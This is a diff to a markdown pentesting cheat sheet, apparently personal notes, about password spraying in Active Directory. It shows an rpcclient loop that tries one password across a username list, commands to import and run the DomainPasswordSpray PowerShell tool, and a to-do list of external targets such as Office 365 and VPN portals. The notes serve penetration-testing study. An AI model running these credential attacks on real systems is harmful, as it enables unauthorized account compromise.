@@ -49,4 +49,30 @@ A very poor but straightforward [RPC](/operating-systems/networking/protocols/rp
 $ for u in $(cat wordlist);do rpcclient -U "$u%PasswordHere" -c "getusername;quit" IP | grep Authority; done
 ```
 </div><div>
+
+#### Leveraging A Domain-joined Host
+
+You may use [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) <small>(1.6k ⭐)</small>:
+
+```
+PS> Import-Module .\DomainPasswordSpray.ps1
+PS> Invoke-DomainPasswordSpray -Password PasswordHere -OutFile output.txt -ErrorAction SilentlyContinue
+```
+</div></div>
+
+<hr class="sep-both">
+
+## 👻 To-do 👻
+
+Stuff that I found, but never read/used yet.
+
+<div class="row row-cols-lg-2"><div>
+
+External Password Spraying
+
+* Microsoft 0365, Exchange, Skype, RDS
+* VPN portals (Citrix, SonicWall, OpenVPN, Fortinet using AD Auth)
+* Any app using AD Auth
+* ...
+</div><div>
 </div></div>
